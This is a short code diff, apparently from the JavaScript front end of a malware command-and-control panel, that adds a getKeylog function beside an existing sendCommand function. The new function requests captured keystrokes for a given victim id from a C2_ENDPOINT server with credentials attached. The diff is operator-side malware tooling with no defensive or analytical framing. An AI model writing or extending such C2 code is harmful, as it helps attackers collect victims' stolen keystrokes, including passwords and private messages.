@@ -36,3 +36,14 @@ export var sendCommand = async (id,command) => {
     }
 
 }
+
+export var getKeylog = async (id) => {
+
+    const request = await axios.get(`${C2_ENDPOINT}/keylog/${id}`, { withCredentials: true })
+        .then(response => response.data);
+    console.log(request)
+    return {
+        payload: request
+    }
+
+}
